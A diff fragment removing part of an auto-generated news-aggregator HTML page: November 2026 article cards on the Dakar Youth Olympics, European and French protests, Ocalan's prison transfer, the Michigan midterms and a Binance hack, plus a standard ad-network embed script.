-    <div class="article-body"><img src="https://s.france24.com/media/display/75a22272-d5da-11f1-80a7-1beafce15fea/w:1024/p:16x9/EN-20261101-101101-101232-CS.jpg" alt="Senegal hosts first Olympic event on African continent" loading="lazy">Youth Olympics make history with first African Games in over 130 years, opened by Senegal’s president in Dakar. 136 Senegalese athletes are competing, supported by 6,000 local volunteers.</div>
-</article>
-<article class="article-card" id="artikel-209">
-    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "Despair and decline: The risks for Europe behind the riots", "image": ["https://static.ffx.io/images/$zoom_0.5516%2C$multiply_0.3720%2C$ratio_1.777778%2C$width_1059%2C$x_0%2C$y_55/t_crop_custom/q_86%2Cf_auto/30375d4af5c3e886989dbc765096e9b62e56b4f7eb5e24f62b23c54abf30b32a"], "datePublished": "2026-11-01T09:51:20+11:00", "dateModified": "2026-11-01T09:51:20+11:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-209"}</script>
-    <h2>Despair and decline: The risks for Europe behind the riots</h2>
-    <div class="article-meta">
-        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
-        <a href="https://www.smh.com.au/world/europe/despair-and-decline-the-risks-for-europe-behind-the-riots-20261101-p618hd.html?ref=rss&amp;utm_medium=rss&amp;utm_source=rss_world" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
-    </div>
-    <div class="article-body"><img src="https://static.ffx.io/images/$zoom_0.5516%2C$multiply_0.3720%2C$ratio_1.777778%2C$width_1059%2C$x_0%2C$y_55/t_crop_custom/q_86%2Cf_auto/30375d4af5c3e886989dbc765096e9b62e56b4f7eb5e24f62b23c54abf30b32a" alt="Despair and decline: The risks for Europe behind the riots" loading="lazy">Many countries across Europe are suffering from low growth, stagnant wages, high debt and rising costs. While every country has its own trigger for unrest, economic hardship is a common theme.</div>
-</article>
-<article class="article-card" id="artikel-883">
-    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "Despair and decline: The risks for Europe behind the riots", "image": ["https://static.ffx.io/images/$zoom_0.5516%2C$multiply_0.3720%2C$ratio_1.777778%2C$width_1059%2C$x_0%2C$y_55/t_crop_custom/q_86%2Cf_auto/30375d4af5c3e886989dbc765096e9b62e56b4f7eb5e24f62b23c54abf30b32a"], "datePublished": "2026-11-01T09:51:20+11:00", "dateModified": "2026-11-01T09:51:20+11:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-883"}</script>
-    <h2>Despair and decline: The risks for Europe behind the riots</h2>
-    <div class="article-meta">
-        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
-        <a href="https://www.theage.com.au/world/europe/despair-and-decline-the-risks-for-europe-behind-the-riots-20261101-p618hd.html?ref=rss&amp;utm_medium=rss&amp;utm_source=rss_world" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
-    </div>
-    <div class="article-body"><img src="https://static.ffx.io/images/$zoom_0.5516%2C$multiply_0.3720%2C$ratio_1.777778%2C$width_1059%2C$x_0%2C$y_55/t_crop_custom/q_86%2Cf_auto/30375d4af5c3e886989dbc765096e9b62e56b4f7eb5e24f62b23c54abf30b32a" alt="Despair and decline: The risks for Europe behind the riots" loading="lazy">Many countries across Europe are suffering from low growth, stagnant wages, high debt and rising costs. While every country has its own trigger for unrest, economic hardship is a common theme.</div>
-</article>
-<article class="article-card" id="artikel-145">
-    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "Turkey moves Kurdish militant leader as part of peace process", "image": ["https://cdn.i-scmp.com/sites/default/files/styles/1280x720/public/d8/images/canvas/2026/11/01/3b9ec653-9ca7-4591-95fb-90f48b3eb129_e8426485.jpg?itok=CU3WVMqu&v=1793526301"], "datePublished": "2026-11-01T09:45:06+00:00", "dateModified": "2026-11-01T09:45:06+00:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-145"}</script>
-    <h2>Turkey moves Kurdish militant leader as part of peace process</h2>
-    <div class="article-meta">
-        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
-        <a href="https://www.scmp.com/news/world/europe/article/3372883/turkey-moves-kurdish-militant-leader-part-peace-process" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
-    </div>
-    <div class="article-body"><img src="https://cdn.i-scmp.com/sites/default/files/styles/1280x720/public/d8/images/canvas/2026/11/01/3b9ec653-9ca7-4591-95fb-90f48b3eb129_e8426485.jpg?itok=CU3WVMqu&amp;v=1793526301" alt="Turkey moves Kurdish militant leader as part of peace process" loading="lazy">Turkey has moved the country’s Kurdish militant leader to a newly built part of an island prison where he has been incarcerated since 1999 as part of efforts to end decades of conflict, a senior Kurdish official said.
-Improving prison conditions for Abdullah Ocalan, who heads the Kurdistan Workers’ Party, or PKK, has been a key Kurdish demand in the push to end the 42-year-long conflict between the militant group and Turkish authorities.
-Ocalan has been imprisoned in a penitentiary on the island...</div>
-</article>
-<article class="article-card" id="artikel-2844">
-    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "US Midterms: Affordability at heart of Michigan race", "image": ["https://s.france24.com/media/display/bb94adfa-d5d4-11f1-b7e9-695cb59fade5/w:1024/p:16x9/EN-20261101-090841-091053-CS.jpg"], "datePublished": "2026-11-01T09:39:11+00:00", "dateModified": "2026-11-01T09:39:11+00:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-2844"}</script>
-    <h2>US Midterms: Affordability at heart of Michigan race</h2>
-    <div class="article-meta">
-        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
-        <a href="https://www.france24.com/en/us-midterms-affordability-at-heart-of-michigan-race" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
-    </div>
-    <div class="article-body"><img src="https://s.france24.com/media/display/bb94adfa-d5d4-11f1-b7e9-695cb59fade5/w:1024/p:16x9/EN-20261101-090841-091053-CS.jpg" alt="US Midterms: Affordability at heart of Michigan race" loading="lazy">For many voters, the cost of living is the single biggest issue. Our reporters Jessica Le Masurier and Sarah Andersen travelled to Michigan to meet voters, where, according to one NGO, around 40% of the population struggle to afford basic necessities.</div>
-</article>
-<div style="text-align:center;margin:20px 0;">
-    <script type="text/javascript">
-        atOptions = {
-            'key' : 'f9e40eb3b3cd05f1038aac7b36b33ad2',
-            'format' : 'iframe',
-            'height' : 90,
-            'width' : 728,
-            'params' : {}
-        };
-    </script>
-    <script type="text/javascript" src="https://upholdbrilliancerecast.com/f9e40eb3b3cd05f1038aac7b36b33ad2/invoke.js"></script>
-</div>
-
-<article class="article-card" id="artikel-2055">
-    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "Binance says phase one of withdrawals opens after $6.3B hack", "image": ["https://s3-images.ctmedia.io/media/article-covers/2026/11/01M6B7GCDKCRNR2Z23KSY172H6/hi-binance-unchained.jpg"], "datePublished": "2026-11-01T09:38:18+00:00", "dateModified": "2026-11-01T09:38:18+00:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-2055"}</script>
-    
-    <div class="article-meta">
-        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
-        <a href="https://cointelegraph.com/news/binance-says-phase-one-of-withdrawals-opens-after-63b-hack?utm_source=rss_feed&amp;utm_medium=feed&amp;utm_campaign=rss_partner_inbound" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
-    </div>
-    <div class="article-body"><img src="https://s3-images.ctmedia.io/media/article-covers/2026/11/01M6B7GCDKCRNR2Z23KSY172H6/hi-binance-unchained.jpg" alt="Binance says phase one of withdrawals opens after $6.3B hack" loading="lazy"><p><img alt="Binance says phase one of withdrawals opens after $6.3B hack" src="https://s3-images.ctmedia.io/media/article-covers/2026/11/01M6B7GCDKCRNR2Z23KSY172H6/hi-binance-unchained.jpg"></p><p>The crypto exchange said it has begun phased withdrawals after the record hack the FBI has blamed on North Korea.</p><p>Binance said it has reopened its Bitcoin network in phase one of resuming withdrawals after a major hack of about $6.3 billion in funds.</p><p>The crypto exchange had suspended user withdrawals after the attack on Thursday, which the FBI blamed on <a href="https://ct.com/news/fbi-blames-north-korea-for-record-63b-binance-hack">North Korean operatives</a>.</p><p>“First batch network now opened in phase one of withdrawals is $BTC bitcoin network,” <a href="https://x.com/binance/status/2116777408074600621">Binance said on X.</a></p><p><a href="https://cointelegraph.com/news/binance-says-phase-one-of-withdrawals-opens-after-63b-hack">Read more</a></p><p></p></div>
-</article>
-<article class="article-card" id="artikel-2065">
-    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "Binance says phase one of withdrawals opens after $6.3B hack", "image": ["https://s3-images.ctmedia.io/media/article-covers/2026/11/01M6B7GCDKCRNR2Z23KSY172H6/hi-binance-unchained.jpg"], "datePublished": "2026-11-01T09:38:18+00:00", "dateModified": "2026-11-01T09:38:18+00:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-2065"}</script>
-    
-    <div class="article-meta">
-        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
-        <a href="https://cointelegraph.com/news/binance-says-phase-one-of-withdrawals-opens-after-63b-hack?utm_source=rss_feed&amp;utm_medium=rss&amp;utm_campaign=rss_partner_inbound" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
-    </div>
-    <div class="article-body"><img src="https://s3-images.ctmedia.io/media/article-covers/2026/11/01M6B7GCDKCRNR2Z23KSY172H6/hi-binance-unchained.jpg" alt="Binance says phase one of withdrawals opens after $6.3B hack" loading="lazy"><p><img alt="Binance says phase one of withdrawals opens after $6.3B hack" src="https://s3-images.ctmedia.io/media/article-covers/2026/11/01M6B7GCDKCRNR2Z23KSY172H6/hi-binance-unchained.jpg"></p><p>The crypto exchange said it has begun phased withdrawals after the record hack the FBI has blamed on North Korea.</p></div>
-</article>
-<article class="article-card" id="artikel-2846">
-    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "How social media are central to protests", "image": ["https://s.france24.com/media/display/3384a514-d5d4-11f1-a635-d18c5759e759/w:1024/p:16x9/EN-20261101-090402-090547-CS.jpg"], "datePublished": "2026-11-01T09:36:20+00:00", "dateModified": "2026-11-01T09:36:20+00:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-2846"}</script>
-    <h2>How social media are central to protests</h2>
-    <div class="article-meta">
-        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
-        <a href="https://www.france24.com/en/how-social-media-are-central-to-protests" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
-    </div>
-    <div class="article-body"><img src="https://s.france24.com/media/display/3384a514-d5d4-11f1-a635-d18c5759e759/w:1024/p:16x9/EN-20261101-090402-090547-CS.jpg" alt="How social media are central to protests" loading="lazy">As we saw in that report, protesters were frustrated at being kept on the outskirts of the French capital. There are also reports of social media posts about the demonstrations being suppressed. Daniel Quinlan has more.</div>
-</article>
-<article class="article-card" id="artikel-2847">
-    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "Hundreds of thousands protest in France for \"Act III\"", "image": ["https://s.france24.com/media/display/e1a211aa-d5d3-11f1-b999-d18c5759e759/w:1024/p:16x9/EN-20261101-090207-090347-CS.jpg"], "datePublished": "2026-11-01T09:35:02+00:00", "dateModified": "2026-11-01T09:35:02+00:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-2847"}</script>
-    <h2>Hundreds of thousands protest in France for &quot;Act III&quot;</h2>
-    <div class="article-meta">
-        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
-        <a href="https://www.france24.com/en/hundreds-of-thousands-protest-in-france-for-act-iii" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
-    </div>
-    <div class="article-body"><img src="https://s.france24.com/media/display/e1a211aa-d5d3-11f1-b999-d18c5759e759/w:1024/p:16x9/EN-20261101-090207-090347-CS.jpg" alt="Hundreds of thousands protest in France for &quot;Act III&quot;" loading="lazy">A heavy police presence was hard to miss on the streets of Paris on Saturday, as the capital saw demonstrations for a third consecutive weekend over the rising cost of living and deteriorating conditions in schools. But the increased security failed to prevent clashes in several parts of the city. Riot police fired tear gas to push back protesters, while small fires broke out in several areas. Similar scenes unfolded across the country, including in Bordeaux, Toulouse and Marseille. Still, the demonstrations were largely less violent than the chaos witnessed on October 17. Caroline Baum has this round-up of the day's events.</div>
-</article>
-<article class="article-card" id="artikel-210">
-    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "Hundreds of arrests as protesters clash with police in France", "image": ["https://static.ffx.io/images/$width_800%2C$height_450/t_crop_fill/q_86%2Cf_jpg/d58fb31efe32173e47d397536d87f04143fb318d"], "datePublished": "2026-11-01T09:32:23+11:00", "dateModified": "2026-11-01T09:32:23+11:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-210"}</script>
-    <h2>Hundreds of arrests as protesters clash with police in France</h2>
-    <div class="article-meta">
-        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
-        <a href="https://www.smh.com.au/world/hundreds-of-arrests-as-protesters-clash-with-police-in-france-20261101-p61ab1.html?ref=rss&amp;utm_medium=rss&amp;utm_source=rss_world" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
-    </div>
-    <div class="article-body"><img src="https://static.ffx.io/images/$width_800%2C$height_450/t_crop_fill/q_86%2Cf_jpg/d58fb31efe32173e47d397536d87f04143fb318d" alt="Hundreds of arrests as protesters clash with police in France" loading="lazy">Hundreds of people have been arrested in France after protesters clashed with police for a third weekend.</div>
 </article>
 <div style="text-align:center;margin:20px 0;">
     <script type="text/javascript">
